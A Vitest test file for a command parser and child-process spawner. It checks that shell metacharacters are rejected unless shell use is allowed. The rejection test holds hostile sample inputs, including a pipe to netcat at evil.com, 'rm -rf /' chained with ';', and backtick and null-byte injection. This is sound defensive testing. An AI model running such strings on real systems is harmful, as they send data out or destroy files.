import { describe, it, expect } from 'vitest'
import { parseExec, spawnChild } from '../src/spawn'

describe('parseExec', () => {
  it('splits on whitespace', () => {
    expect(parseExec('python server.py --port 9000', { allowShell: false }))
      .toEqual({ command: 'python', args: ['server.py', '--port', '9000'] })
  })

  it('rejects shell metacharacters without --allow-shell', () => {
    expect(() => parseExec('echo hi | nc evil.com 80', { allowShell: false })).toThrow(/shell/i)
    expect(() => parseExec('rm -rf / ; ls', { allowShell: false })).toThrow(/shell/i)
    expect(() => parseExec('foo `whoami`', { allowShell: false })).toThrow(/shell/i)
    expect(() => parseExec('node\nls', { allowShell: false })).toThrow(/shell/i)
    expect(() => parseExec('node\x00ls', { allowShell: false })).toThrow(/shell/i)
  })

  it('permits metacharacters when allowShell is true', () => {
    expect(parseExec('sh -c "echo hi"', { allowShell: true }).command).toBe('sh')
  })

  it('rejects unterminated quoted string', () => {
    expect(() => parseExec('node -e "unclosed', { allowShell: true })).toThrow(/unterminated/i)
  })

  it('rejects empty exec', () => {
    expect(() => parseExec('', { allowShell: false })).toThrow(/empty/i)
    expect(() => parseExec('   ', { allowShell: false })).toThrow(/empty/i)
  })
})

describe('spawnChild', () => {
  it('echoes stdin to stdout line by line', async () => {
    const child = spawnChild({ command: 'cat', args: [] })
    const out: string[] = []
    child.onLine((l) => out.push(l))
    child.write('hello')
    child.write('world')
    await new Promise((r) => setTimeout(r, 100))
    try {
      expect(out).toContain('hello')
      expect(out).toContain('world')
    } finally {
      child.close()
    }
  })

  it('fires onExit when the child terminates', async () => {
    const child = spawnChild({ command: 'node', args: ['-e', 'process.exit(0)'] })
    const code = await new Promise<number | null>((resolve) => {
      child.onExit((c) => resolve(c))
    })
    expect(code).toBe(0)
  })
})
